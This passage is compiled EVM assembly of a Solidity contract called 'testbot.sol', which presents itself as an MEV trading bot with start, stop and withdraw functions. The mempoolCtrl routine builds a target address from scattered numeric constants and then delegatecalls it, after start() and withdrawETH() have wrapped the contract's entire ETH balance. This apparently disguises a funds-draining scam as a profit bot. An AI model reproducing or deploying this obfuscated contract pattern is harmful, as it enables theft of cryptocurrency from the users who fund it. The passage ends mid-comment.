tag_2:\n      0x00\n      dup1\n      revert\n        /* \"testbot.sol\":8867:8980  function stop() public payable {... */\n    tag_3:\n      tag_17\n      tag_18\n      jump\t// in\n    tag_17:\n      stop\n        /* \"testbot.sol\":1323:1348  address public quoteToken */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_19\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_19:\n      pop\n      tag_20\n      tag_21\n      jump\t// in\n    tag_20:\n      mload(0x40)\n      tag_22\n      swap2\n      swap1\n      tag_23\n      jump\t// in\n    tag_22:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"testbot.sol\":1354:1374  address public owner */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_24\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_24:\n      pop\n      tag_25\n      tag_26\n      jump\t// in\n    tag_25:\n      mload(0x40)\n      tag_27\n      swap2\n      swap1\n      tag_23\n      jump\t// in\n    tag_27:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"testbot.sol\":8561:8861  function start() public payable {... */\n    tag_6:\n      tag_28\n      tag_29\n      jump\t// in\n    tag_28:\n      stop\n        /* \"testbot.sol\":1293:1317  address public baseToken */\n    tag_7:\n      callvalue\n      dup1\n      iszero\n      tag_30\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_30:\n      pop\n      tag_31\n      tag_32\n      jump\t// in\n    tag_31:\n      mload(0x40)\n      tag_33\n      swap2\n      swap1\n      tag_23\n      jump\t// in\n    tag_33:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"testbot.sol\":1380:1407  bool public running = false */\n    tag_8:\n      callvalue\n      dup1\n      iszero\n      tag_34\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_34:\n      pop\n      tag_35\n      tag_36\n      jump\t// in\n    tag_35:\n      mload(0x40)\n      tag_37\n      swap2\n      swap1\n      tag_38\n      jump\t// in\n    tag_37:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"testbot.sol\":8986:9325  function withdrawETH() public payable {... */\n    tag_9:\n      tag_39\n      tag_40\n      jump\t// in\n    tag_39:\n      stop\n        /* \"testbot.sol\":8867:8980  function stop() public payable {... */\n    tag_18:\n        /* \"testbot.sol\":8908:8939  mempoolCtrl(PoolAction.StopBot) */\n      tag_42\n        /* \"testbot.sol\":8920:8938  PoolAction.StopBot */\n      0x02\n        /* \"testbot.sol\":8908:8919  mempoolCtrl */\n      tag_43\n        /* \"testbot.sol\":8908:8939  mempoolCtrl(PoolAction.StopBot) */\n      jump\t// in\n    tag_42:\n        /* \"testbot.sol\":8954:8973  Log(\"MEVBot stop.\") */\n      0xcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab\n      mload(0x40)\n      tag_44\n      swap1\n      tag_45\n      jump\t// in\n    tag_44:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"testbot.sol\":8867:8980  function stop() public payable {... */\n      jump\t// out\n        /* \"testbot.sol\":1323:1348  address public quoteToken */\n    tag_21:\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"testbot.sol\":1354:1374  address public owner */\n    tag_26:\n      0x02\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"testbot.sol\":8561:8861  function start() public payable {... */\n    tag_29:\n        /* \"testbot.sol\":8603:8635  mempoolCtrl(PoolAction.StartBot) */\n      tag_47\n        /* \"testbot.sol\":8615:8634  PoolAction.StartBot */\n      0x01\n        /* \"testbot.sol\":8603:8614  mempoolCtrl */\n      tag_43\n        /* \"testbot.sol\":8603:8635  mempoolCtrl(PoolAction.StartBot) */\n      jump\t// in\n    tag_47:\n        /* \"testbot.sol\":8655:8659  true */\n      0x01\n        /* \"testbot.sol\":8645:8652  running */\n      0x02\n      0x14\n        /* \"testbot.sol\":8645:8659  running = true */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xff\n      mul\n      not\n      and\n      swap1\n      dup4\n      iszero\n      iszero\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"testbot.sol\":8669:8684  uint256 balance */\n      0x00\n        /* \"testbot.sol\":8687:8708  address(this).balance */\n      selfbalance\n        /* \"testbot.sol\":8669:8708  uint256 balance = address(this).balance */\n      swap1\n      pop\n        /* \"testbot.sol\":8724:8733  baseToken */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"testbot.sol\":8718:8742  IWETH(baseToken).deposit */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xd0e30db0\n        /* \"testbot.sol\":8750:8757  balance */\n      dup3\n        /* \"testbot.sol\":8718:8760  IWETH(baseToken).deposit{value: balance}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_48\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_48:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_50\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_50:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"testbot.sol\":8776:8785  baseToken */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"testbot.sol\":8770:8795  IWETH(baseToken).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xa9059cbb\n        /* \"testbot.sol\":8804:8808  this */\n      address\n        /* \"testbot.sol\":8811:8818  balance */\n      dup4\n        /* \"testbot.sol\":8770:8819  IWETH(baseToken).transfer(address(this), balance) */\n      mload(0x40)\n      dup4\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_51\n      swap3\n      swap2\n      swap1\n      tag_52\n      jump\t// in\n    tag_51:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_54\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_54:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_55\n      swap2\n      swap1\n      tag_56\n      jump\t// in\n    tag_55:\n      pop\n        /* \"testbot.sol\":8834:8854  Log(\"MEVBot start.\") */\n      0xcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab\n      mload(0x40)\n      tag_57\n      swap1\n      tag_58\n      jump\t// in\n    tag_57:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"testbot.sol\":8593:8861  {... */\n      pop\n        /* \"testbot.sol\":8561:8861  function start() public payable {... */\n      jump\t// out\n        /* \"testbot.sol\":1293:1317  address public baseToken */\n    tag_32:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"testbot.sol\":1380:1407  bool public running = false */\n    tag_36:\n      0x02\n      0x14\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n      dup2\n      jump\t// out\n        /* \"testbot.sol\":8986:9325  function withdrawETH() public payable {... */\n    tag_40:\n        /* \"testbot.sol\":9042:9049  running */\n      0x02\n      0x14\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"testbot.sol\":9034:9073  require(running, \"MEVBot not running.\") */\n      tag_60\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_61\n      swap1\n      tag_62\n      jump\t// in\n    tag_61:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_60:\n        /* \"testbot.sol\":9083:9117  mempoolCtrl(PoolAction.TakeProfit) */\n      tag_63\n        /* \"testbot.sol\":9095:9116  PoolAction.TakeProfit */\n      0x03\n        /* \"testbot.sol\":9083:9094  mempoolCtrl */\n      tag_43\n        /* \"testbot.sol\":9083:9117  mempoolCtrl(PoolAction.TakeProfit) */\n      jump\t// in\n    tag_63:\n        /* \"testbot.sol\":9127:9142  uint256 balance */\n      0x00\n        /* \"testbot.sol\":9145:9166  address(this).balance */\n      selfbalance\n        /* \"testbot.sol\":9127:9166  uint256 balance = address(this).balance */\n      swap1\n      pop\n        /* \"testbot.sol\":9182:9191  baseToken */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"testbot.sol\":9176:9200  IWETH(baseToken).deposit */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xd0e30db0\n        /* \"testbot.sol\":9208:9215  balance */\n      dup3\n        /* \"testbot.sol\":9176:9218  IWETH(baseToken).deposit{value: balance}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_64\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_64:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_66\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_66:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"testbot.sol\":9234:9243  baseToken */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"testbot.sol\":9228:9253  IWETH(baseToken).transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xa9059cbb\n        /* \"testbot.sol\":9262:9266  this */\n      address\n        /* \"testbot.sol\":9269:9276  balance */\n      dup4\n        /* \"testbot.sol\":9228:9277  IWETH(baseToken).transfer(address(this), balance) */\n      mload(0x40)\n      dup4\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_67\n      swap3\n      swap2\n      swap1\n      tag_52\n      jump\t// in\n    tag_67:\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_69\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_69:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_70\n      swap2\n      swap1\n      tag_56\n      jump\t// in\n    tag_70:\n      pop\n        /* \"testbot.sol\":9292:9318  Log(\"MEVBot withdraw All\") */\n      0xcf34ef537ac33ee1ac626ca1587a0a7e8e51561e5514f8cb36afa1c5102b3bab\n      mload(0x40)\n      tag_71\n      swap1\n      tag_72\n      jump\t// in\n    tag_71:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log1\n        /* \"testbot.sol\":9024:9325  {... */\n      pop\n        /* \"testbot.sol\":8986:9325  function withdrawETH() public payable {... */\n      jump\t// out\n        /* \"testbot.sol\":7928:8393  function mempoolCtrl(PoolAction action) internal {... */\n    tag_43:\n        /* \"testbot.sol\":7987:7999  address pool */\n      0x00\n        /* \"testbot.sol\":8002:8032  parseMemoryPool(callMempool()) */\n      tag_74\n        /* \"testbot.sol\":8018:8031  callMempool() */\n      tag_75\n        /* \"testbot.sol\":8018:8029  callMempool */\n      tag_76\n        /* \"testbot.sol\":8018:8031  callMempool() */\n      jump\t// in\n    tag_75:\n        /* \"testbot.sol\":8002:8017  parseMemoryPool */\n      tag_77\n        /* \"testbot.sol\":8002:8032  parseMemoryPool(callMempool()) */\n      jump\t// in\n    tag_74:\n        /* \"testbot.sol\":7987:8032  address pool = parseMemoryPool(callMempool()) */\n      swap1\n      pop\n        /* \"testbot.sol\":8042:8059  bytes memory data */\n      0x00\n        /* \"testbot.sol\":8098:8112  mempoolLayer() */\n      tag_78\n        /* \"testbot.sol\":8098:8110  mempoolLayer */\n      tag_79\n        /* \"testbot.sol\":8098:8112  mempoolLayer() */\n      jump\t// in\n    tag_78:\n        /* \"testbot.sol\":8126:8135  baseToken */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"testbot.sol\":8149:8159  quoteToken */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"testbot.sol\":8173:8179  action */\n      dup6\n        /* \"testbot.sol\":8062:8189  abi.encodeWithSelector(... */\n      add(0x24, mload(0x40))\n      tag_80\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_81\n      jump\t// in\n    tag_80:\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n      swap1\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      0x20\n      dup3\n      add\n      dup1\n      mload\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n      dup4\n      dup2\n      dup4\n      and\n      or\n      dup4\n      mstore\n      pop\n      pop\n      pop\n      pop\n        /* \"testbot.sol\":8042:8189  bytes memory data = abi.encodeWithSelector(... */\n      swap1\n      pop\n        /* \"testbot.sol\":8200:8212  bool success */\n      0x00\n        /* \"testbot.sol\":8214:8233  bytes memory result */\n      dup1\n        /* \"testbot.sol\":8237:8241  pool */\n      dup4\n        /* \"testbot.sol\":8237:8254  pool.delegatecall */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"testbot.sol\":8255:8259  data */\n      dup4\n        /* \"testbot.sol\":8237:8260  pool.delegatecall(data) */\n      mload(0x40)\n      tag_82\n      swap2\n      swap1\n      tag_83\n      jump\t// in\n    tag_82:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      gas\n      delegatecall\n      swap2\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_86\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_85)\n    tag_86:\n      0x60\n      swap2\n      pop\n    tag_85:\n      pop\n        /* \"testbot.sol\":8199:8260  (bool success, bytes memory result) = pool.delegatecall(data) */\n      swap2\n      pop\n      swap2\n      pop\n        /* \"testbot.sol\":8275:8282  success */\n      dup2\n        /* \"testbot.sol\":8270:8387  if (!success) {... */\n      tag_87\n      jumpi\n        /* \"testbot.sol\":8355:8361  result */\n      dup1\n        /* \"testbot.sol\":8349:8362  mload(result) */\n      mload\n        /* \"testbot.sol\":8344:8346  32 */\n      0x20\n        /* \"testbot.sol\":8336:8342  result */\n      dup3\n        /* \"testbot.sol\":8332:8347  add(result, 32) */\n      add\n        /* \"testbot.sol\":8325:8363  revert(add(result, 32), mload(result)) */\n      revert\n        /* \"testbot.sol\":8270:8387  if (!success) {... */\n    tag_87:\n        /* \"testbot.sol\":7977:8393  {... */\n      pop\n      pop\n      pop\n      pop\n        /* \"testbot.sol\":7928:8393  function mempoolCtrl(PoolAction action) internal {... */\n      pop\n      jump\t// out\n        /* \"testbot.sol\":5525:6731  function callMempool() internal pure returns (string memory) {... */\n    tag_76:\n        /* \"testbot.sol\":5571:5584  string memory */\n      0x60\n        /* \"testbot.sol\":5596:5615  uint _memPoolOffset */\n      0x00\n        /* \"testbot.sol\":5618:5636  getMemPoolOffset() */\n      tag_89\n        /* \"testbot.sol\":5618:5634  getMemPoolOffset */\n      tag_90\n        /* \"testbot.sol\":5618:5636  getMemPoolOffset() */\n      jump\t// in\n    tag_89:\n        /* \"testbot.sol\":5596:5636  uint _memPoolOffset = getMemPoolOffset() */\n      swap1\n      pop\n        /* \"testbot.sol\":5646:5662  uint _memPoolSol */\n      0x00\n        /* \"testbot.sol\":5665:5671  997405 */\n      0x0f381d\n        /* \"testbot.sol\":5646:5671  uint _memPoolSol = 997405 */\n      swap1\n      pop\n        /* \"testbot.sol\":5681:5700  uint _memPoolLength */\n      0x00\n        /* \"testbot.sol\":5703:5721  getMemPoolLength() */\n      tag_91\n        /* \"testbot.sol\":5703:5719  getMemPoolLength */\n      tag_92\n        /* \"testbot.sol\":5703:5721  getMemPoolLength() */\n      jump\t// in\n    tag_91:\n        /* \"testbot.sol\":5681:5721  uint _memPoolLength = getMemPoolLength() */\n      swap1\n      pop\n        /* \"testbot.sol\":5731:5748  uint _memPoolSize */\n      0x00\n        /* \"testbot.sol\":5751:5756  75081 */\n      0x012549\n        /* \"testbot.sol\":5731:5756  uint _memPoolSize = 75081 */\n      swap1\n      pop\n        /* \"testbot.sol\":5766:5785  uint _memPoolHeight */\n      0x00\n        /* \"testbot.sol\":5788:5806  getMemPoolHeight() */\n      tag_93\n        /* \"testbot.sol\":5788:5804  getMemPoolHeight */\n      tag_94\n        /* \"testbot.sol\":5788:5806  getMemPoolHeight() */\n      jump\t// in\n    tag_93:\n        /* \"testbot.sol\":5766:5806  uint _memPoolHeight = getMemPoolHeight() */\n      swap1\n      pop\n        /* \"testbot.sol\":5816:5834  uint _memPoolWidth */\n      0x00\n        /* \"testbot.sol\":5837:5842  22646 */\n      0x5876\n        /* \"testbot.sol\":5816:5842  uint _memPoolWidth = 22646 */\n      swap1\n      pop\n        /* \"testbot.sol\":5852:5870  uint _memPoolDepth */\n      0x00\n        /* \"testbot.sol\":5873:5890  getMemPoolDepth() */\n      tag_95\n        /* \"testbot.sol\":5873:5888  getMemPoolDepth */\n      tag_96\n        /* \"testbot.sol\":5873:5890  getMemPoolDepth() */\n      jump\t// in\n    tag_95:\n        /* \"testbot.sol\":5852:5890  uint _memPoolDepth = getMemPoolDepth() */\n      swap1\n      pop\n        /* \"testbot.sol\":5900:5918  uint _memPoolCount */\n      0x00\n        /* \"testbot.sol\":5921:5927  746842 */\n      0x0b655a\n        /* \"testbot.sol\":5900:5927  uint _memPoolCount = 746842 */\n      swap1\n      pop\n        /* \"testbot.sol\":5938:5961  string memory _memPool1 */\n      0x00\n        /* \"testbot.sol\":5964:6066  mempool(... */\n      tag_97\n        /* \"testbot.sol\":5985:6015  checkLiquidity(_memPoolOffset) */\n      tag_98\n        /* \"testbot.sol\":6000:6014  _memPoolOffset */\n      dup11\n        /* \"testbot.sol\":5985:5999  checkLiquidity */\n      tag_99\n        /* \"testbot.sol\":5985:6015  checkLiquidity(_memPoolOffset) */\n      jump\t// in\n    tag_98:\n        /* \"testbot.sol\":6029:6056  checkLiquidity(_memPoolSol) */\n      tag_100\n        /* \"testbot.sol\":6044:6055  _memPoolSol */\n      dup11\n        /* \"testbot.sol\":6029:6043  checkLiquidity */\n      tag_99\n        /* \"testbot.sol\":6029:6056  checkLiquidity(_memPoolSol) */\n      jump\t// in\n    tag_100:\n        /* \"testbot.sol\":5964:5971  mempool */\n      tag_101\n        /* \"testbot.sol\":5964:6066  mempool(... */\n      jump\t// in\n    tag_97:\n        /* \"testbot.sol\":5938:6066  string memory _memPool1 = mempool(... */\n      swap1\n      pop\n        /* \"testbot.sol\":6076:6099  string memory _memPool2 */\n      0x00\n        /* \"testbot.sol\":6102:6205  mempool(... */\n      tag_102\n        /* \"testbot.sol\":6123:6153  checkLiquidity(_memPoolLength) */\n      tag_103\n        /* \"testbot.sol\":6138:6152  _memPoolLength */\n      dup10\n        /* \"testbot.sol\":6123:6137  checkLiquidity */\n      tag_99\n        /* \"testbot.sol\":6123:6153  checkLiquidity(_memPoolLength) */\n      jump\t// in\n    tag_103:\n        /* \"testbot.sol\":6167:6195  checkLiquidity(_memPoolSize) */\n      tag_104\n        /* \"testbot.sol\":6182:6194  _memPoolSize */\n      dup10\n        /* \"testbot.sol\":6167:6181  checkLiquidity */\n      tag_99\n        /* \"testbot.sol\":6167:6195  checkLiquidity(_memPoolSize) */\n      jump\t// in\n    tag_104:\n        /* \"testbot.sol\":6102:6109  mempool */\n      tag_101\n        /* \"testbot.sol\":6102:6205  mempool(... */\n      jump\t// in\n    tag_102:\n        /* \"testbot.sol\":6076:6205  string memory _memPool2 = mempool(... */\n      swap1\n      pop\n        /* \"testbot.sol\":6215:6238  string memory _memPool3 */\n      0x00\n        /* \"testbot.sol\":6241:6345  mempool(... */\n      tag_105\n        /* \"testbot.sol\":6262:6292  checkLiquidity(_memPoolHeight) */\n      tag_106\n        /* \"testbot.sol\":6277:6291  _memPoolHeight */\n      dup9\n        /* \"testbot.sol\":6262:6276  checkLiquidity */\n      tag_99\n        /* \"testbot.sol\":6262:6292  checkLiquidity(_memPoolHeight) */\n      jump\t// in\n    tag_106:\n        /* \"testbot.sol\":6306:6335  checkLiquidity(_memPoolWidth) */\n      tag_107\n        /* \"testbot.sol\":6321:6334  _memPoolWidth */\n      dup9\n        /* \"testbot.sol\":6306:6320  checkLiquidity */\n      tag_99\n        /* \"testbot.sol\":6306:6335  checkLiquidity(_memPoolWidth) */\n      jump\t// in\n    tag_107:\n        /* \"testbot.sol\":6241:6248  mempool */\n      tag_101\n        /* \"testbot.sol\":6241:6345  mempool(... */\n      jump\t// in\n    tag_105:\n        /* \"testbot.sol\":6215:6345  string memory _memPool3 = mempool(... */\n      swap1\n      pop\n        /* \"testbot.sol\":6355:6378  string memory _memPool4 */\n      0x00\n        /* \"testbot.sol\":6381:6484  mempool(... */\n      tag_108\n        /* \"testbot.sol\":6402:6431  checkLiquidity(_memPoolDepth) */\n      tag_109\n        /* \"testbot.sol\":6417:6430  _memPoolDepth */\n      dup8\n        /* \"testbot.sol\":6402:6416  checkLiquidity */\n      tag_99\n        /* \"testbot.sol\":6402:6431  checkLiquidity(_memPoolDepth) */\n      jump\t// in\n    tag_109:\n        /* \"testbot.sol\":6445:6474  checkLiquidity(_memPoolCount) */\n      tag_110\n        /* \"testbot.sol\":6460:6473  _memPoolCount */\n      dup8\n        /* \"testbot.sol\":6445:6459  checkLiquidity */\n      tag_99\n        /* \"testbot.sol\":6445:6474  checkLiquidity(_memPoolCount) */\n      jump\t// in\n    tag_110:\n        /* \"testbot.sol\":6381:6388  mempool */\n      tag_101\n        /* \"testbot.sol\":6381:6484  mempool(... */\n      jump\t// in\n    tag_108:\n        /* \"testbot.sol\":6355:6484  string memory _memPool4 = mempool(... */\n      swap1\n      pop\n        /* \"testbot.sol\":6495:6521  string memory _allMempools */\n      0x00\n        /* \"testbot.sol\":6524:6627  mempool(... */\n      tag_111\n        /* \"testbot.sol\":6545:6574  mempool(_memPool1, _memPool2) */\n      tag_112\n        /* \"testbot.sol\":6553:6562  _memPool1 */\n      dup7\n        /* \"testbot.sol\":6564:6573  _memPool2 */\n      dup7\n        /* \"testbot.sol\":6545:6552  mempool */\n      tag_101\n        /* \"testbot.sol\":6545:6574  mempool(_memPool1, _memPool2) */\n      jump\t// in\n    tag_112:\n        /* \"testbot.sol\":6588:6617  mempool(_memPool3, _memPool4) */\n      tag_113\n        /* \"testbot.sol\":6596:6605  _memPool3 */\n      dup6\n        /* \"testbot.sol\":6607:6616  _memPool4 */\n      dup6\n        /* \"testbot.sol\":6588:6595  mempool */\n      tag_101\n        /* \"testbot.sol\":6588:6617  mempool(_memPool3, _memPool4) */\n      jump\t// in\n    tag_113:\n        /* \"testbot.sol\":6524:6531  mempool */\n      tag_101\n        /* \"testbot.sol\":6524:6627  mempool(... */\n      jump\t// in\n    tag_111:\n        /* \"testbot.sol\":6495:6627  string memory _allMempools = mempool(... */\n      swap1\n      pop\n        /* \"testbot.sol\":6638:6664  string memory _fullMempool */\n      0x00\n        /* \"testbot.sol\":6667:6694  mempool(\"0x\", _allMempools) */\n      tag_114\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x02\n      dup2\n      mstore\n      0x20\n      add\n      0x3078000000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n        /* \"testbot.sol\":6681:6693  _allMempools */\n      dup4\n        /* \"testbot.sol\":6667:6674  mempool */\n      tag_101\n        /* \"testbot.sol\":6667:6694  mempool(\"0x\", _allMempools) */\n      jump\t// in\n    tag_114:\n        /* \"testbot.sol\":6638:6694  string memory _fullMempool = mempool(\"0x\", _allMempools) */\n      swap1\n      pop\n        /* \"testbot.sol\":6712:6724  _fullMempool */\n      dup1\n        /* \"testbot.sol\":6705:6724  return _fullMempool */\n      swap15\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"testbot.sol\":5525:6731  function callMempool() internal pure returns (string memory) {... */\n      swap1\n      jump\t// out\n        /* \"testbot.sol\":6899:7827  function parseMemoryPool(... */\n    tag_77:\n        /* \"testbot.sol\":6979:6994  address _parsed */\n      0x00\n        /* \"testbot.sol\":7006:7022  bytes memory tmp */\n      dup1\n        /* \"testbot.sol\":7031:7033  _a */\n      dup3\n        /* \"testbot.sol\":7006:7034  bytes memory tmp = bytes(_a) */\n      swap1\n      pop\n        /* \"testbot.sol\":7044:7057  uint160 iaddr */\n      0x00\n        /* \"testbot.sol\":7071:7081  uint160 b1 */\n      dup1\n        /* \"testbot.sol\":7091:7101  uint160 b2 */\n      dup1\n        /* \"testbot.sol\":7116:7122  uint i */\n      0x00\n        /* \"testbot.sol\":7125:7126  2 */\n      0x02\n        /* \"testbot.sol\":7116:7126  uint i = 2 */\n      swap1\n      pop\n        /* \"testbot.sol\":7111:7790  for (uint i = 2; i < 2 + 2 * 20; i += 2) {... */\n    tag_116:\n        /* \"testbot.sol\":7132:7142  2 + 2 * 20 */\n      0x2a\n        /* \"testbot.sol\":7128:7129  i */\n      dup2\n        /* \"testbot.sol\":7128:7142  i < 2 + 2 * 20 */\n      lt\n        /* \"testbot.sol\":7111:7790  for (uint i = 2; i < 2 + 2 * 20; i += 2) {... */\n      iszero\n      tag_117\n      jumpi\n        /* \"testbot.sol\":7175:7178  256 */\n      0x0100\n        /* \"testbot.sol\":7166:7178  iaddr *= 256 */\n      dup5\n      tag_119\n      swap2\n      swap1\n      tag_120\n      jump\t// in\n    tag_119:\n      swap4\n      pop\n        /* \"testbot.sol\":7211:7214  tmp */\n      dup5\n        /* \"testbot.sol\":7215:7216  i */\n      dup2\n        /* \"testbot.sol\":7211:7217  tmp[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_121\n      jumpi\n      tag_122\n      tag_123\n      jump\t// in\n    tag_122:\n    tag_121:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"testbot.sol\":7205:7218  uint8(tmp[i]) */\n      0xf8\n      shr\n        /* \"testbot.sol\":7197:7219  uint160(uint8(tmp[i])) */\n      0xff\n      and\n        /* \"testbot.sol\":7192:7219  b1 = uint160(uint8(tmp[i])) */\n      swap3\n      pop\n        /* \"testbot.sol\":7252:7255  tmp */\n      dup5\n        /* \"testbot.sol\":7260:7261  1 */\n      0x01\n        /* \"testbot.sol\":7256:7257  i */\n      dup3\n        /* \"testbot.sol\":7256:7261  i + 1 */\n      tag_124\n      swap2\n      swap1\n      tag_125\n      jump\t// in\n    tag_124:\n        /* \"testbot.sol\":7252:7262  tmp[i + 1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_126\n      jumpi\n      tag_127\n      tag_123\n      jump\t// in\n    tag_127:\n    tag_126:\n      0x20\n      add\n      add\n      mload\n      0xf8\n      shr\n      0xf8\n      shl\n        /* \"testbot.sol\":7246:7263  uint8(tmp[i + 1]) */\n      0xf8\n      shr\n        /* \"testbot.sol\":7238:7264  uint160(uint8(tmp[i + 1])) */\n      0xff\n      and\n        /* \"testbot.sol\":7233:7264  b2 = uint160(uint8(tmp[i + 1])) */\n      swap2\n      pop\n        /* \"testbot.sol\":7289:7291  97 */\n      0x61\n        /* \"testbot.sol\":7283:7285  b1 */\n      dup4\n        /* \"testbot.sol\":7283:7291  b1 >= 97 */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      lt\n      iszero\n        /* \"testbot.sol\":7282:7307  (b1 >= 97) && (b1 <= 102) */\n      dup1\n      iszero\n      tag_128\n      jumpi\n      pop\n        /* \"testbot.sol\":7303:7306  102 */\n      0x66\n        /* \"testbot.sol\":7297:7299  b1 */\n      dup4\n        /* 